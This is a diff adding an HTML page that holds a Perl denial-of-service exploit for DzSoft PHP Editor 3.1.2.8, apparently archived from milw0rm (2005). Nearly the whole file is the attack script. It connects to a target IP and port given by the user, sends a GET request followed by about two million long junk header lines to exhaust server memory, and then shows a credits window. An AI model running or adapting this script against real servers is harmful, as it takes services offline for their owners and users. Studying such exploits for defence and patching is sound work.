@@ -1,0 +1,91 @@
+<html>
+<head>
+<title>DzSoft PHP Editor <= 3.1.2.8 Denial of Service Exploit</title>
+<pre>
+#!/usr/bin/perl
+#
+#    DzSoft PHP Server DOS Exploit
+# ------------------------------------
+#  Infam0us Gr0up - Securiti Research
+# 
+#
+# Tested on Windows2000 SP4 (Win NT)
+# Info: infamous.2hell.com
+#
+
+$subject = &quot;DzSoft PHP Server DOS Exploit&quot;;
+$vers = &quot;DzSoft PHP Editor  3.1.2.8&quot;;
+$vendor = &quot;http://www.dzsoft.com&quot;;
+$codz = &quot;basher13 - basher13(at)linuxmail.org&quot;;
+
+$ARGC=@ARGV;
+if ($ARGC !=2) {
+    print &quot;\n&quot;;
+    print &quot;   $subject\n&quot;;
+    print &quot;------------------------------------\n\n&quot;;
+    print &quot;Usage: $0 [remote IP] [port]\n&quot;;
+    print &quot;Exam: $0 127.0.0.1 80\n&quot;;
+    exit;
+}
+
+use IO::Socket::INET;
+use Tk;
+
+$host=$ARGV[0];
+$port=$ARGV[1];
+
+print &quot;\n&quot;;
+print &quot;-------------------------------------------------------\n&quot;;
+print &quot;[?] Version: libwww-perl-$LWP::VERSION\n&quot;;
+print &quot;[+] Connect to $host..\n&quot;;
+$sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $host,PeerPort =&gt; $port, Proto =&gt; 'tcp') 
+|| die &quot;[-] Connection error$@\n&quot;;
+
+print &quot;[+] Connected\n&quot;;
+print &quot;[+] Bindmode for socket..\n&quot;;
+sleep(1);
+binmode($sock);
+
+print &quot;[+] Build buffer..\n&quot;;
+$hostname=&quot;Host: $host&quot;;
+$bufy='A'x50;
+$bufa='A'x8183;
+$len=length($bufy);
+$buff=&quot;GET / HTTP/1.1\r\n&quot;;
+sleep(1);
+
+print &quot;[+] Now kill the process..wait\n&quot;;
+send($sock,$buff,0) || die &quot;[-] send error:$@\n&quot;;
+print &quot;[+] Sending buffer..\n&quot;;
+for($i= 0; $i &lt; 2000000; $i++)
+{
+    $buff=&quot; $bufa\r\n&quot;;
+    send($sock,$buff,0) || die &quot;[*] send error:$@, Check if server D0s'ed\n&quot;;
+}
+$buff=&quot;$hostname\r\n&quot;;
+$buff.=&quot;Content-Length: $len\r\n&quot;;
+
+$buff.=&quot;\r\n&quot;;
+$buff.=$bufy.&quot;\r\n\r\n&quot;;
+
+send($sock,$buff,0) || die &quot;[-] send error:$@\n&quot;;
+print &quot;[+] Server Out of Memory\n&quot;;
+close($sock);
+print &quot;-------------------------------------------------------\n&quot;;
+my $mw = MainWindow-&gt;new(-title =&gt; 'INFO',);
+    my $var;
+
+    my $opt = $mw-&gt;Optionmenu(
+                
+                -options =&gt; [qw()],
+                -command =&gt; sub { print &quot;\n[&gt;]: &quot;, shift, &quot;\n&quot; },
+                -variable =&gt; \$var,
+                )-&gt;pack;
+    $opt-&gt;addOptions([- Subject=&gt;$subject],[- Version=&gt;$vers],[- Vendor=&gt;$vendor],[- Coder=&gt;$codz]);   
+    $mw-&gt;Button(-text=&gt;'CLOSE', -command=&gt;sub{$mw-&gt;destroy})-&gt;pack;
+    MainLoop;
+
+# milw0rm.com [2005-07-15]
+</pre>
+</html>
+
